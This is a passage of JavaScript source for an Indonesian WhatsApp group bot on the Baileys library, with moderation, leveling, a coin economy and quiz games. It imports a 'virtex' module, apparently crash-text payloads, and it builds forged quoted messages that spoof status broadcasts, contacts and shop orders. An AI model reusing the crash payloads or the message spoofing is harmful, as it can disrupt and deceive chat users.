const {
       WAConnection,
       MessageType,
       Presence,
       MessageOptions,
       Mimetype,
       WALocationMessage,
       WA_MESSAGE_STUB_TYPES,
       WA_DEFAULT_EPHEMERAL,
       ReconnectMode,
       ProxyAgent,
       ChatModification,
       GroupSettingChange,
       waChatKey,
       mentionedJid,
       processTime,
       Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const {
       spawn,
       exec,
       execSync
} = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require('yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');
const {
       virtex,
       vipi
} = require('./lib/virtex.js')
const Mfake = fs.readFileSync('./media/diablo.png')
const Mthumb = fs.readFileSync('./media/diablo.png')
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM')

// stickwm
const Exif = require('./lib/exif');
const exif = new Exif();

const {
       downloadMenu,
       infoMenu,
       gameMenu,
       groupMenu,
       funMenu,
       wibuMenu,
       ownerMenu,
       stickerMenu,
       otherMenu,
       rulesBot,
       sertiMenu,
       ceritaMenu,
       makerMenu,
       dewasaMenu,
       toolsMenu
} = require('./message/help.js')
const {
       getBuffer,
       getGroupAdmins,
       getRandom,
       runtime,
       sleep
} = require('./lib/myfunc')
const {
       fetchJson,
       getBase64,
       kyun,
       createExif
} = require('./lib/fetch')
const {
       color,
       bgcolor
} = require('./lib/color')
const {
       mess
} = require('./message/mess')
const {
       Toxic
} = require('./lib/Toxic.js')
const {
       cmdadd
} = require('./lib/totalcmd.js')
const {
       uptotele,
       uploadFile,
       RESTfulAPI,
       uploadImages
} = require('./lib/uploadimage')
const {
       isGame,
       gameAdd,
       givegame,
       cekGLimit
} = require("./lib/limit");
const {
       onGoing,
       dadu,
       asupan
} = require("./lib/otakudesu.js")
const {
       mediafireDl
} = require('./lib/mediafire.js')
const {
       webp2gifFile,
       igDownloader,
       TiktokDownloader
} = require("./lib/gif.js")
const {
       y2mateA,
       y2mateV
} = require('./lib/y2mate')
const {
       ythd
} = require('./lib/ytdl')
const premium = require("./lib/premium");
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");

var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]

let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
let fakeimage = fs.readFileSync("./media/diablo.png")
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let setting = JSON.parse(fs.readFileSync('./setting.json'))

owner = setting.owner
gamewaktu = setting.gamewaktu
petik = '```'
fake = 'CREATOR BOT\©hzkyx' //GANTI NAMA KAMU BEP
ban = []

// Database
let register = JSON.parse(fs.readFileSync('./database/user/register.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))

// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

// Sticker Cmd
const addCmd = (id, command) => {
       const obj = {
              id: id,
              chats: command
       }
       _scommand.push(obj)
       fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
       let position = null
       Object.keys(_scommand).forEach((i) => {
              if (_scommand[i].id === id) {
                     position = i
              }
       })
       if (position !== null) {
              return position
       }
}

const getCmd = (id) => {
       let position = null
       Object.keys(_scommand).forEach((i) => {
              if (_scommand[i].id === id) {
                     position = i
              }
       })
       if (position !== null) {
              return _scommand[position].chats
       }
}


const checkSCommand = (id) => {
       let status = false
       Object.keys(_scommand).forEach((i) => {
              if (_scommand[i].id === id) {
                     status = true
              }
       })
       return status
}


module.exports = dha = async (dha, mek) => {
       try {
              if (!mek.hasNewMessage) return
              mek = mek.messages.all()[0]
              if (!mek.message) return
              if (mek.key && mek.key.remoteJid == 'status@broadcast') return
              if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
              global.ky_ttt
              global.blocked
              mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
              const {
                     text,
                     extendedText,
                     contact,
                     location,
                     liveLocation,
                     image,
                     video,
                     sticker,
                     document,
                     audio,
                     product
              } = MessageType
              const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
              const content = JSON.stringify(mek.message)
              const from = mek.key.remoteJid
              const type = Object.keys(mek.message)[0]
              const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
              const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
              body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
              budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
              const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
              const args = body.trim().split(/ +/).slice(1)
              hit_today.push(command)
              const arg = body.substring(body.indexOf(' ') + 1)
              const ar = args.map((v) => v.toLowerCase())
              const argz = body.trim().split(/ +/).slice(1)
              const isCmd = body.startsWith(prefix)
              if (isCmd) cmdadd()
              const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
              const q = args.join(' ')

              const botNumber = dha.user.jid
              const ownerNumber = setting.ownerNumber
              const ownerName = setting.ownerName
              const botName = setting.botName
              const isGroup = from.endsWith('@g.us')
              let sender = isGroup ? mek.participant : mek.key.remoteJid
              let senderr = mek.key.fromMe ? dha.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
              const totalchat = await dha.chats.all()
              const groupMetadata = isGroup ? await dha.groupMetadata(from) : ''
              const groupName = isGroup ? groupMetadata.subject : ''
              const groupId = isGroup ? groupMetadata.jid : ''
              const groupMembers = isGroup ? groupMetadata.participants : ''
              const groupDesc = isGroup ? groupMetadata.desc : ''
              const groupOwner = isGroup ? groupMetadata.owner : ''
              const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
              const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
              const isGroupAdmins = groupAdmins.includes(sender) || false
              const conts = mek.key.fromMe ? dha.user.jid : dha.contacts[sender] || {
                     notify: jid.replace(/@.+/, '')
              }
              const pushname = mek.key.fromMe ? dha.user.name : conts.notify || conts.vname || conts.name || '-'
              const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
              const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
              const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
              mention != undefined ? mention.push(mentionByreply) : []
              const mentionUser = mention != undefined ? mention.filter(n => n) : []
              idttt = []
              players1 = []
              players2 = []
              gilir = []
              for (let t of ky_ttt) {
                     idttt.push(t.id)
                     players1.push(t.player1)
                     players2.push(t.player2)
                     gilir.push(t.gilir)
              }
              const isTTT = isGroup ? idttt.includes(from) : false
              isPlayer1 = isGroup ? players1.includes(sender) : false
              isPlayer2 = isGroup ? players2.includes(sender) : false
              const isOwner = ownerNumber.includes(senderr)
              const isPremium = premium.checkPremiumUser(sender, _premium)
              const isSewa = _sewa.checkSewaGroup(from, sewa)
              const isAfkOn = afk.checkAfkUser(sender, _afk)
              const isLevelingOn = isGroup ? _leveling.includes(from) : false
              const isMuted = isGroup ? mute.includes(from) : false
              const isAntiLink = isGroup ? antilink.includes(from) : false
              const isWelkom = isGroup ? welkom.includes(from) : false

              // here button function
              selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

              responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

              const gcount = setting.gcount

              const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
                     let po = dha.prepareMessageFromContent(from, {
                            "listMessage": {
                                   "title": title,
                                   "description": desc,
                                   "buttonText": "Pilih Disini",
                                   "footerText": "SEMOGA DAPAT MEMBANTU",
                                   "listType": "SINGLE_SELECT",
                                   "sections": list
                            }
                     }, {})
                     return dha.relayWAMessage(po, {
                            waitForAck: true
                     })
              }

              const isUrl = (url) => {
                     return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
              }

              function monospace(string) {
                     return '```' + string + '```'
              }

              function jsonformat(string) {
                     return JSON.stringify(string, null, 2)
              }

              function randomNomor(angka) {
                     return Math.floor(Math.random() * angka) + 1
              }
              const reply = (teks) => {
                     dha.sendMessage(from, teks, text, {
                            quoted: mek,
                            thumbnail: fakeimage
                     })
              }
              const sendMess = (hehe, teks) => {
                     dha.sendMessage(hehe, teks, text)
              }
              const mentions = (teks, memberr, id) => {
                     (id == null || id == undefined || id == false) ? dha.sendMessage(from, {
                            text: teks.trim(),
                            jpegThumbnail: fs.readFileSync('./media/diablo.png')
                     }, extendedText, {
                            sendEphemeral: true,
                            contextInfo: {
                                   "mentionedJid": memberr
                            }
                     }): dha.sendMessage(from, {
                            text: teks.trim(),
                            jpegThumbnail: fs.readFileSync('./media/diablo.png')
                     }, extendedText, {
                            sendEphemeral: true,
                            quoted: mek,
                            contextInfo: {
                                   "mentionedJid": memberr
                            }
                     })
              }
              const sendText = (from, text) => {
                     dha.sendMessage(from, text, MessageType.text)
              }
              const textImg = (teks) => {
                     return dha.sendMessage(from, teks, text, {
                            quoted: mek,
                            thumbnail: fs.readFileSync('./media/diablo.png')
                     })
              }
              const freply = {
                     key: {
                            fromMe: false,
                            participant: `0@s.whatsapp.net`,
                            ...(from ? {
                                   remoteJid: '16504228206@s.whatsapp.net'
                            } : {})
                     },
                     message: {
                            "contactMessage": {
                                   "displayName": `${pushname}`,
                                   "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                                   "jpegThumbnail": fs.readFileSync('./media/diablo.png')
                            }
                     }
              }
              const math = (teks) => {
                     return Math.floor(teks)
              }
              const kick = function (from, orangnya) {
                     for (let i of orangnya) {
                            dha.groupRemove(from, [i])
                     }
              }

              const kickMember = async (id, target = []) => {
                     let group = await dha.groupMetadata(id)
                     let owner = group.owner.replace("c.us", "s.whatsapp.net")
                     let me = dha.user.jid
                     for (i of target) {
                            if (!i.includes(me) && !i.includes(owner)) {
                                   await dha.groupRemove(to, [i])
                            } else {
                                   await dha.sendMessage(id, "Not Premited!", "conversation")
                                   break
                            }
                     }
              }
              const add = function (from, orangnya) {
                     dha.groupAdd(from, orangnya)
              }
              const sendKontak = (from, nomor, nama, org = "") => {
                     const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
                     dha.sendMessage(from, {
                            displayname: nama,
                            vcard: vcard
                     }, MessageType.contact, {
                            quoted: mek
                     })
              }
              const hideTag = async function (from, text) {
                     let anu = await dha.groupMetadata(from)
                     let members = anu.participants
                     let ane = []
                     for (let i of members) {
                            ane.push(i.jid)
                     }
                     dha.sendMessage(from, {
                            text: text,
                            jpegThumbnail: fs.readFileSync('media/diablo.png')
                     }, 'extendedTextMessage', {
                            contextInfo: {
                                   "mentionedJid": ane
                            }
                     })
              }
              const sendWebp = async (to, url) => {
                     var names = Date.now() / 10000;
                     var download = function (uri, filename, callback) {
                            request.head(uri, function (err, res, body) {
                                   request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                            });
                     };
                     download(url, './sticker' + names + '.png', async function () {
                            console.log('selesai');
                            let filess = './sticker' + names + '.png'
                            let asw = './sticker' + names + '.webp'
                            exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
                                   fs.unlinkSync(filess)
                                   if (err) return reply(`${err}`)
                                   exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
                                          if (error) return reply(`${error}`)
                                          dha.sendMessage(from, fs.readFileSync(asw), sticker, {
                                                 sendEphemeral: true,
                                                 quoted: mek
                                          })
                                          fs.unlinkSync(asw)
                                   });
                            });
                     });
              }
              const sendMediaURL = async (to, url, text = "", mids = []) => {
                     if (mids.length > 0) {
                            text = normalizeMention(to, text, mids)
                     }
                     const fn = Date.now() / 10000;
                     const filename = fn.toString()
                     let mime = ""
                     var download = function (uri, filename, callback) {
                            request.head(uri, function (err, res, body) {
                                   mime = res.headers['content-type']
                                   request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                            });
                     };
                     download(url, filename, async function () {
                            console.log('done');
                            let media = fs.readFileSync(filename)
                            let type = mime.split("/")[0] + "Message"
                            if (mime === "image/gif") {
                                   type = MessageType.video
                                   mime = Mimetype.gif
                            }
                            if (mime.split("/")[0] === "audio") {
                                   mime = Mimetype.mp4Audio
                            }
                            dha.sendMessage(to, media, type, {
                                   quoted: mek,
                                   mimetype: mime,
                                   caption: text,
                                   thumbnail: Buffer.alloc(0),
                                   contextInfo: {
                                          "mentionedJid": mids
                                   }
                            })

                            fs.unlinkSync(filename)
                     });
              }
              const sendFileFromUrl = async (link, type, options) => {
                     hasil = await getBuffer(link)
                     dha.sendMessage(from, hasil, type, options).catch(e => {
                            fetch(link).then((hasil) => {
                                   dha.sendMessage(from, hasil, type, options).catch(e => {
                                          dha.sendMessage(from, {
                                                 url: link
                                          }, type, options).catch(e => {
                                                 reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
                                                 console.log(e)
                                          })
                                   })
                            })
                     })
              }
              const promoteAdmin = async function (to, target = []) {
                     if (!target.length > 0) {
                            return reply("No target..")
                     }
                     let g = await dha.groupMetadata(to)
                     let owner = g.owner.replace("c.us", "s.whatsapp.net")
                     let me = dha.user.jid
                     for (i of target) {
                            if (!i.includes(me) && !i.includes(owner)) {
                                   const res = await dha.groupMakeAdmin(to, [i])
                                   reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`)
                            }
                     }
              }
              const demoteAdmin = async function (to, target = []) {
                     if (!target.length > 0) {
                            return reply("No target..")
                     }
                     let g = await dha.groupMetadata(to)
                     let owner = g.owner.replace("c.us", "s.whatsapp.net")
                     let me = dha.user.jid
                     for (i of target) {
                            if (!i.includes(me) && !i.includes(owner)) {
                                   const res = await dha.groupDemoteAdmin(to, [i])
                                   reply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`)

                            }
                     }
              }
              let authorname = dha.contacts[from] != undefined ? dha.contacts[from].vname || dha.contacts[from].notify : undefined
              if (authorname != undefined) {} else {
                     authorname = groupName
              }

              function addMetadata(packname, author) {
                     if (!packname) packname = 'WABot';
                     if (!author) author = 'Bot';
                     author = author.replace(/[^a-zA-Z0-9]/g, '');
                     let name = `${author}_${packname}`
                     if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
                     const json = {
                            "sticker-pack-name": packname,
                            "sticker-pack-publisher": author,
                     }
                     const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
                     const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
                     let len = JSON.stringify(json).length
                     let last
                     if (len > 256) {
                            len = len - 256
                            bytes.unshift(0x01)
                     } else {
                            bytes.unshift(0x00)
                     }
                     if (len < 16) {
                            last = len.toString(16)
                            last = "0" + len
                     } else {
                            last = len.toString(16)
                     }
                     const buf2 = Buffer.from(last, "hex")
                     const buf3 = Buffer.from(bytes)
                     const buf4 = Buffer.from(JSON.stringify(json))
                     const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])
                     fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {
                            return `./sticker/${name}.exif`
                     })
              }


              const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
              if (time2 < "23:59:00") {
                     var ucapanWaktu = 'Selamat Malam🌃'
              }
              if (time2 < "19:00:00") {
                     var ucapanWaktu = 'Selamat Petang🌆'
              }
              if (time2 < "18:00:00") {
                     var ucapanWaktu = 'Selamat Sore🌇'
              }
              if (time2 < "15:00:00") {
                     var ucapanWaktu = 'Selamat Siang🏙️'
              }
              if (time2 < "11:00:00") {
                     var ucapanWaktu = 'Selamat Pagi🌅'
              }
              if (time2 < "05:00:00") {
                     var ucapanWaktu = 'Selamat Malam🌃'
              }
              const levelRole = level.getLevelingLevel(sender, _level)
              var role = 'Warrior III'
              if (levelRole <= 5) {
                     role = 'Warrior II'
              } else if (levelRole <= 10) {
                     role = 'Warrior I'
              } else if (levelRole <= 15) {
                     role = 'Elite III'
              } else if (levelRole <= 20) {
                     role = 'Elite II'
              } else if (levelRole <= 25) {
                     role = 'Elite I'
              } else if (levelRole <= 30) {
                     role = 'Master III'
              } else if (levelRole <= 35) {
                     role = 'Master II'
              } else if (levelRole <= 40) {
                     role = 'Master I'
              } else if (levelRole <= 45) {
                     role = 'GrandMaster III'
              } else if (levelRole <= 50) {
                     role = 'GrandMaster II'
              } else if (levelRole <= 55) {
                     role = 'GrandMaster I'
              } else if (levelRole <= 60) {
                     role = 'Epic III'
              } else if (levelRole <= 65) {
                     role = 'Epic II'
              } else if (levelRole <= 70) {
                     role = 'Epic I'
              } else if (levelRole <= 75) {
                     role = 'Legend III'
              } else if (levelRole <= 80) {
                     role = 'Legend II'
              } else if (levelRole <= 85) {
                     role = 'Legend I'
              } else if (levelRole <= 90) {
                     role = 'Mythic'
              } else if (levelRole <= 95) {
                     role = 'Mythical Glory'
              } else if (levelRole >= 100) {
                     role = 'Immortal'
              }
              // FUNCTION LEVELING
              if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
                     try {
                            level.addCooldown(sender)
                            const checkATM = atm.checkATMuser(sender, _uang)
                            if (checkATM === undefined) atm.addATM(sender, _uang)
                            const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
                            atm.addKoinUser(sender, uangsaku, _uang)
                            const currentLevel = level.getLevelingLevel(sender, _level)
                            const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
                            const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
                            level.addLevelingXp(sender, amountXp, _level)
                            if (requiredXp <= level.getLevelingXp(sender, _level)) {
                                   level.addLevelingLevel(sender, 1, _level)
                                   const userLevel = level.getLevelingLevel(sender, _level)
                                   const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
                                   reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
                            }
                     } catch (err) {
                            console.error(err)
                     }
              }
              colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
              const isMedia = (type === 'imageMessage' || type === 'videoMessage')
              const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
              const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
              const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
              const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
              const troli = {
                     key: {
                            fromMe: false,
                            remoteJid: "status@broadcast",
                            participant: '0@s.whatsapp.net'
                     },
                     message: {
                            orderMessage: {
                                   itemCount: 300,
                                   status: 200,
                                   thumbnail: fakeimage,
                                   surface: 200,
                                   message: fake,
                                   orderTitle: 'dha',
                                   sellerJid: '0@s.whatsapp.net'
                            }
                     }
              }
              const ftext = {
                     key: {
                            fromMe: false,
                            participant: `0@s.whatsapp.net`,
                            ...(from ? {
                                   remoteJid: "16505434800@s.whatsapp.net"
                            } : {})
                     },
                     message: {
                            "extendedTextMessage": {
                                   "text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,
                                   "title": `Hmm`,
                                   'jpegThumbnail': fs.readFileSync('./media/diablo.png')
                            }
                     }
              }
              const ftoko = {
                     key: {
                            fromMe: false,
                            participant: `0@s.whatsapp.net`,
                            ...(from ? {
                                   remoteJid: "16505434800@s.whatsapp.net"
                            } : {})
                     },
                     message: {
                            "productMessage": {
                                   "product": {
                                          "productImage": {
                                                 "mimetype": "image/jpeg",
                                                 "jpegThumbnail": fs.readFileSync(`./media/diablo.png`)
                                          },
                                          "title": `HALLO...${pushname}JANGAN LUPA DI ORDER`,
                                          "description": "NOIR BOT",
                                          "currencyCode": "IDR",
                                          "priceAmount1000": "999999",
                                          "retailerId": "NOIR BOT",
                                          "productImageCount": 1
                                   },
                                   "businessOwnerJid": `0@s.whatsapp.net`
                            }
                     }
              }

              // Anti link
              if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins) {
                     if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                            reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                            dha.groupRemove(from, [sender])
                     }
              }


              let {
                     banChats,
              } = setting

              function banChat() {
                     if (banChats == true) {
                            return false
                     } else {
                            return true
                     }
              }

              // Sewa
              _sewa.expiredCheck(dha, sewa)

              // MUTE
              if (isMuted) {
                     if (!isGroupAdmins && !isPremium) return
              }

              const getWin = (userId) => {
                     let position = false
                     Object.keys(_win).forEach((i) => {
                            if (_win[i].jid === userId) {
                                   position = i
                            }
                     })
                     if (position !== false) {
                            return _win[position].win
                     }
              }
              // GAME 
              game.cekWaktuFam(dha, family100)

              if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakgambar[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var http = randomNomor(100)
                            atm.addKoinUser(sender, http, _uang)
                            await reply(`*_🎮 Tebak Gambar  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${http} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                            delete tebakgambar[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                     }
              }
              if (game.isfam(from, family100)) {
                     var anjuy = game.getjawaban100(from, family100)
                     for (let i of anjuy) {
                            if (budy.toLowerCase().includes(i)) {
                                   var htgmp = Math.floor(Math.random() * 20) + 1
                                   atm.addKoinUser(sender, htgmp, _uang)
                                   await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmp}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                                   var anug = anjuy.indexOf(i)
                                   anjuy.splice(anug, 1)
                            }
                     }
                     if (anjuy.length < 1) {
                            dha.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                            family100.splice(game.getfamposi(from, family100), 1)
                     }
              }
              if (tebakanime.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebakanime[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgmu = randomNomor(100)
                            atm.addKoinUser(sender, htgmu, _uang)
                            await reply(`*_🎮 Tebak Anime 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htgmu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebakanime*`)
                            delete tebakanime[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebakanime.json", JSON.stringify(tebakanime))
                     }
              }
              if (tebaklagu.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebaklagu[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htpl = randomNomor(100)
                            atm.addKoinUser(sender, htpl, _uang)
                            await reply(`*_🎮 Tebak Lagu 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpl} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaklagu*`)
                            delete tebaklagu[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebaklagu.json", JSON.stringify(tebaklagu))
                     }
              }
              if (tebaktebakan.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = tebaktebakan[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htpu = randomNomor(100)
                            atm.addKoinUser(sender, htpu, _uang)
                            await reply(`*_🎮 Tebak Tebakan 🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htpu} 💰_\n\nIngin bermain lagi? kirim *${prefix}tebaktebakan*`)
                            delete tebaktebakan[sender.split('@')[0]]
                            fs.writeFileSync("./database/tebaktebakan.json", JSON.stringify(tebaktebakan))
                     }
              }
              if (kuismath.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = kuismath[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htcc = randomNomor(100)
                            atm.addKoinUser(sender, htcc, _uang)
                            await reply(`*_🎮 Kuis Matematika  🎮_*\n\n*•* *Jawaban Benar🎉*\n*•* *Mendapatkan* : _Rp ${htcc} 💰_\n\nIngin bermain lagi? kirim *${prefix}kuismath*`)
                            delete kuismath[sender.split('@')[0]]
                            fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                     }
              }
              if (asahotak.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                     kuis = true
                     jawaban = asahotak[sender.split('@')[0]]
                     if (budy.toLowerCase() == jawaban) {
                            var htgm = randomNomor(100)
                            atm.addKoinUser(sender, htgm, _uang)
